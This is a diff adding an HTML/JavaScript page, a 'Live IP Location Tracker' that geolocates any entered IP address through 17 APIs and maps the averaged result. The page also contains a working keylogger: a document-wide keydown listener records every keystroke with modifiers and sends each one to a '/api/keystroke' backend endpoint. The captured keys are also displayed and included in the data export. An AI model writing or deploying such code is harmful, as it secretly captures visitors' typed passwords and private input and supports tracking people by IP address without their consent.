@@ -1,0 +1,506 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Live IP Location Tracker</title>
+  <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
+  <style>
+    :root {
+      --text: red;
+      --highlight: #10b981;
+      --panel: rgba(0, 0, 0, 0.5);
+      --font: 'Segoe UI', sans-serif;
+    }
+
+    body {
+      font-family: var(--font);
+      margin: 0;
+      position: relative;
+      overflow: hidden;
+      background-image: url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSFVOZ2CsKQIPT0Lk06f5bNALaBIuEhMWppBg&s');
+      background-size: cover;
+      background-repeat: no-repeat;
+      color: var(--text);
+    }
+
+    #bgVideo {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      z-index: -2;
+      opacity: 0.3;
+    }
+
+    header {
+      background: rgba(0, 0, 0, 0.5);
+      padding: 1rem;
+      text-align: center;
+      font-size: 1.8rem;
+      font-weight: bold;
+      border-bottom: 2px solid var(--text);
+      position: relative;
+      z-index: 10;
+    }
+
+    .container {
+      max-width: 1000px;
+      margin: auto;
+      padding: 1rem;
+      position: relative;
+      z-index: 10;
+    }
+
+    .controls {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 10px;
+      justify-content: center;
+      margin-bottom: 1rem;
+    }
+
+    .api-selector {
+      background: var(--panel);
+      padding: 10px;
+      border-radius: 0.4rem;
+      border: 1px solid var(--text);
+      max-height: 200px;
+      overflow-y: auto;
+      margin: 10px;
+      min-width: 250px;
+    }
+
+    .api-item {
+      display: flex;
+      align-items: center;
+      gap: 5px;
+      margin: 3px 0;
+      font-size: 0.85rem;
+    }
+
+    .api-item input[type="checkbox"] {
+      accent-color: var(--text);
+    }
+
+    input[type="text"],
+    input[type="file"] {
+      padding: 0.5rem;
+      border-radius: 0.4rem;
+      border: none;
+      background: var(--panel);
+      color: var(--highlight);
+    }
+
+    button {
+      padding: 0.5rem;
+      border-radius: 0.4rem;
+      border: none;
+      background: var(--text);
+      color: var(--highlight);
+      cursor: pointer;
+    }
+
+    button:hover {
+      background: rgba(0, 0, 0, 0.5);
+      color: var(--text);
+    }
+
+    button:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+    }
+
+    #map {
+      height: 500px;
+      border-radius: 0.5rem;
+      margin-bottom: 1rem;
+      border: 2px solid var(--text);
+    }
+
+    .logs,
+    .saved-markers-list,
+    .keylogger {
+      background: var(--panel);
+      padding: 1rem;
+      border-radius: 0.5rem;
+      max-height: 200px;
+      overflow-y: auto;
+      font-size: 0.9rem;
+      margin-top: 1rem;
+    }
+
+    .log-entry,
+    .marker-item,
+    .key-entry {
+      padding: 0.3rem 0;
+      border-top: 1px solid red;
+      display: flex;
+      justify-content: space-between;
+    }
+
+    .remove-marker {
+      cursor: pointer;
+      color: red;
+    }
+
+    .actions {
+      display: flex;
+      gap: 10px;
+      justify-content: center;
+      flex-wrap: wrap;
+      margin-top: 10px;
+    }
+
+    .status {
+      text-align: center;
+      padding: 10px;
+      background: var(--panel);
+      border-radius: 0.4rem;
+      margin: 10px 0;
+      font-weight: bold;
+    }
+
+    .backend-status {
+      color: var(--highlight);
+      font-size: 0.9rem;
+    }
+
+    @media (max-width: 768px) {
+      .container {
+        padding: 0.5rem;
+      }
+      #map {
+        height: 400px;
+      }
+      .api-selector {
+        min-width: 100%;
+      }
+    }
+  </style>
+</head>
+<body>
+  <video id="bgVideo" autoplay muted loop playsinline>
+    <source src="ca63eccfcf11bcd02c1a900196de630f_720w.mp4" type="video/mp4">
+  </video>
+
+  <header>Live IP Location Tracker</header>
+
+  <div class="container">
+    <div class="status">
+      <div>🔗 Backend Status: <span id="backendStatus" class="backend-status">Checking...</span></div>
+    </div>
+
+    <div class="controls">
+      <input type="text" id="ipInput" placeholder="Enter IP address" />
+      
+      <div class="api-selector">
+        <div style="font-weight: bold; margin-bottom: 5px;">Select APIs:</div>
+        <div id="apiList"></div>
+      </div>
+      
+      <button id="getLocationBtn">Get Location</button>
+      <button id="saveMarkerBtn">Save Marker</button>
+      <button id="clearMarkersBtn">Clear All Markers</button>
+    </div>
+
+    <div class="actions">
+      <button id="copyInfoBtn">Copy Info</button>
+      <button id="exportJsonBtn">Export All Data</button>
+      <input type="file" id="importFile" />
+      <button id="resetMapBtn">Reset Map</button>
+      <button id="toggleThemeBtn">Toggle Theme</button>
+    </div>
+
+    <div id="map"></div>
+
+    <div class="logs" id="log"><strong>Activity Log:</strong></div>
+    <div class="saved-markers-list" id="savedMarkersList"><strong>Saved Markers:</strong></div>
+    <div class="keylogger" id="keylogger"><strong>Keylogger (Live Backend):</strong></div>
+  </div>
+
+  <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.6.0/axios.min.js"></script>
+  <script>
+    const map = L.map('map').setView([20, 0], 2);
+    L.tileLayer('https://basemaps.cartocdn.com/dark_all/{z}/{x}/{y}.png', {
+      attribution: '© OpenStreetMap contributors'
+    }).addTo(map);
+
+    let currentMarker = null;
+    let currentInfo = '';
+    let savedMarkers = [];
+    let keystrokes = [];
+    const logPanel = document.getElementById('log');
+    const savedMarkersList = document.getElementById('savedMarkersList');
+    const keyloggerPanel = document.getElementById('keylogger');
+    const apiList = document.getElementById('apiList');
+    const backendStatus = document.getElementById('backendStatus');
+    const getLocationBtn = document.getElementById('getLocationBtn');
+
+    // 17 LIVE APIs - EXACT URLs/Keys
+    const providers = [
+      'abstract', 'geolocationio', 'ip2location', 'locationiq', 'graphhopper',
+      'geoapify', 'geocodingmaps', 'opencagedata', 'distancematrix', 'zipcodeapi',
+      'billingWhoisFreak', 'ipGeolocationWhoisXmlApi', 'dnsHistoryWhoisXmlApi',
+      'cloudflareTrace', 'ipdata', 'metadapi', 'smarty'
+    ];
+
+    // Create API selector checkboxes
+    providers.forEach(provider => {
+      const div = document.createElement('div');
+      div.className = 'api-item';
+      div.innerHTML = `
+        <input type="checkbox" id="${provider}" value="${provider}" checked>
+        <label for="${provider}">${provider}</label>
+      `;
+      apiList.appendChild(div);
+    });
+
+    // Check Vercel Backend connection
+    async function checkBackend() {
+      try {
+        const res = await fetch('/api/ping');
+        if (res.ok) {
+          backendStatus.textContent = '✅ LIVE (Vercel)';
+          backendStatus.style.color = '#10b981';
+          return true;
+        }
+      } catch (e) {
+        backendStatus.textContent = '❌ OFFLINE';
+        backendStatus.style.color = 'red';
+      }
+      return false;
+    }
+
+    // POWERFUL KEYLOGGER with Backend Sync
+    document.addEventListener('keydown', async (e) => {
+      const keyData = {
+        key: e.key,
+        code: e.code,
+        ctrl: e.ctrlKey,
+        shift: e.shiftKey,
+        alt: e.altKey,
+        time: new Date().toISOString()
+      };
+      
+      keystrokes.push(keyData);
+      if (keystrokes.length > 100) keystrokes.shift();
+      
+      const entry = document.createElement('div');
+      entry.className = 'key-entry';
+      entry.innerHTML = `[${new Date().toLocaleTimeString()}] ${keyData.key} (${keyData.code})${keyData.ctrl?'[Ctrl]':''}${keyData.shift?'[Shift]':''}${keyData.alt?'[Alt]':''}`;
+      keyloggerPanel.prepend(entry);
+      
+      if (keyloggerPanel.children.length > 25) {
+        keyloggerPanel.removeChild(keyloggerPanel.lastChild);
+      }
+
+      // Live Backend Sync
+      try {
+        await fetch('/api/keystroke', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(keyData)
+        });
+      } catch (e) {}
+    });
+
+    // MAIN MULTI-API TRACKER - 17 LIVE APIs
+    document.getElementById('getLocationBtn').addEventListener('click', async () => {
+      const ip = document.getElementById('ipInput').value.trim();
+      if (!ip) return alert("Enter an IP address.");
+
+      const selectedProviders = Array.from(document.querySelectorAll('#apiList input:checked')).map(cb => cb.value);
+      
+      getLocationBtn.disabled = true;
+      getLocationBtn.textContent = '🔍 Tracking...';
+      log(`🔍 Tracking ${ip} with ${selectedProviders.length} APIs (Backend)`);
+
+      try {
+        const response = await fetch('/api/track', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            ip,
+            providers: selectedProviders
+          })
+        });
+
+        const data = await response.json();
+        
+        if (data.success && data.results.length > 0) {
+          displayResults(data.results, ip);
+          log(`✅ ${data.results.length} APIs triangulated location`);
+        } else {
+          log('❌ No valid results from APIs');
+        }
+
+      } catch (err) {
+        log('❌ Backend connection failed');
+        console.error(err);
+      } finally {
+        getLocationBtn.disabled = false;
+        getLocationBtn.textContent = 'Get Location';
+      }
+    });
+
+    function displayResults(results, ip) {
+      // Calculate AVERAGE location from ALL APIs
+      const avgLat = results.reduce((sum, r) => sum + r.lat, 0) / results.length;
+      const avgLon = results.reduce((sum, r) => sum + r.lon, 0) / results.length;
+
+      currentInfo = `🚀 MULTI-API TRIANGULATION (${results.length}):\nIP: ${ip}\n\n` +
+        results.map(r => `${r.provider.toUpperCase()}: ${r.city}, ${r.country} (${r.lat.toFixed(4)}, ${r.lon.toFixed(4)})`).join('\n') +
+        `\n\n📍 BACKEND AVERAGE: ${avgLat.toFixed(4)}, ${avgLon.toFixed(4)}`;
+
+      log(`🎯 Triangulated ${results.length} providers`);
+
+      map.setView([avgLat, avgLon], 10);
+
+      if (currentMarker) map.removeLayer(currentMarker);
+
+      // MAIN AVERAGE MARKER
+      currentMarker = L.marker([avgLat, avgLon]).addTo(map)
+        .bindPopup(currentInfo)
+        .openPopup();
+
+      // INDIVIDUAL API MARKERS (SMALL RED CIRCLES)
+      results.forEach((result, index) => {
+        L.circleMarker([result.lat, result.lon], {
+          radius: 8,
+          fillColor: '#ff0000',
+          color: '#ffffff',
+          weight: 2,
+          opacity: 0.9,
+          fillOpacity: 0.8
+        }).addTo(map)
+        .bindPopup(`🖥️ ${result.provider.toUpperCase()}<br>${result.city}, ${result.country}<br>${result.isp}`);
+      });
+    }
+
+    // Save Marker
+    document.getElementById('saveMarkerBtn').addEventListener('click', () => {
+      if (!currentMarker) return alert("No marker to save.");
+
+      const { lat, lng } = currentMarker.getLatLng();
+      savedMarkers.push({ lat, lng, info: currentInfo });
+      localStorage.setItem('savedMarkers', JSON.stringify(savedMarkers));
+      log(`💾 Saved Multi-API Marker: ${lat.toFixed(4)}, ${lng.toFixed(4)}`);
+      updateSavedMarkersList();
+    });
+
+    document.getElementById('clearMarkersBtn').addEventListener('click', () => {
+      if (confirm("Clear all markers?")) {
+        localStorage.removeItem('savedMarkers');
+        map.eachLayer(layer => {
+          if (layer instanceof L.Marker || layer instanceof L.CircleMarker) {
+            map.removeLayer(layer);
+          }
+        });
+        updateSavedMarkersList();
+        log("🗑️ All markers cleared.");
+      }
+    });
+
+    document.getElementById('copyInfoBtn').addEventListener('click', () => {
+      if (!currentInfo) return alert("No info to copy.");
+      navigator.clipboard.writeText(currentInfo);
+      log("📋 Multi-API data copied.");
+    });
+
+    document.getElementById('exportJsonBtn').addEventListener('click', () => {
+      const exportData = {
+        markers: savedMarkers,
+        keystrokes: keystrokes,
+        exportTime: new Date().toISOString()
+      };
+      const blob = new Blob([JSON.stringify(exportData, null, 2)], { type: 'application/json' });
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = 'ip-tracker-data.json';
+      a.click();
+      URL.revokeObjectURL(url);
+      log("💾 Exported ALL Data + Keylogger.");
+    });
+
+    document.getElementById('importFile').addEventListener('change', (e) => {
+      const file = e.target.files[0];
+      if (!file) return;
+      const reader = new FileReader();
+      reader.onload = () => {
+        try {
+          const data = JSON.parse(reader.result);
+          if (data.markers) {
+            savedMarkers = data.markers;
+            localStorage.setItem('savedMarkers', JSON.stringify(savedMarkers));
+            updateSavedMarkersList();
+          }
+          if (data.keystrokes) keystrokes = data.keystrokes;
+          log("✅ Imported Data + Markers.");
+        } catch {
+          log("❌ Invalid JSON.");
+        }
+      };
+      reader.readAsText(file);
+    });
+
+    document.getElementById('resetMapBtn').addEventListener('click', () => {
+      map.setView([20, 0], 2);
+      log("🔄 Map reset.");
+    });
+
+    document.getElementById('toggleThemeBtn').addEventListener('click', () => {
+      const root = document.documentElement;
+      const currentPanel = getComputedStyle(root).getPropertyValue('--panel');
+      if (currentPanel === 'rgba(0, 0, 0, 0.5)') {
+        root.style.setProperty('--panel', 'rgba(255, 0, 0, 0.3)');
+        root.style.setProperty('--text', '#00ff00');
+        root.style.setProperty('--highlight', 'yellow');
+      } else {
+        root.style.setProperty('--panel', 'rgba(0, 0, 0, 0.5)');
+        root.style.setProperty('--text', 'red');
+        root.style.setProperty('--highlight', '#10b981');
+      }
+      log("🎨 Theme toggled.");
+    });
+
+    function log(message) {
+      const entry = document.createElement('div');
+      entry.className = 'log-entry';
+      entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
+      logPanel.prepend(entry);
+    }
+
+    function updateSavedMarkersList() {
+      savedMarkers = JSON.parse(localStorage.getItem('savedMarkers') || '[]');
+      savedMarkersList.innerHTML = "<strong>Saved Markers:</strong>";
+      savedMarkers.forEach((m, i) => {
+        const entry = document.createElement('div');
+        entry.className = 'marker-item';
+        entry.innerHTML = `Lat: ${m.lat.toFixed(4)}, Lng: ${m.lng.toFixed(4)} <span class="remove-marker" onclick="removeMarker(${i})">❌</span>`;
+        savedMarkersList.appendChild(entry);
+
+        L.marker([m.lat, m.lng]).addTo(map)
+          .bindPopup(m.info || `Saved: ${m.lat.toFixed(4)}, ${m.lng.toFixed(4)}`);
+      });
+    }
+
+    window.removeMarker = (index) => {
+      savedMarkers.splice(index, 1);
+      localStorage.setItem('savedMarkers', JSON.stringify(savedMarkers));
+      updateSavedMarkersList();
+      log("🗑️ Marker removed.");
+    };
+
+    window.onload = async () => {
+      updateSavedMarkersList();
+      await checkBackend();
+      log("🚀 17-API Tracker + Keylogger LIVE");
+    };
+  </script>
+</body>
+</html>
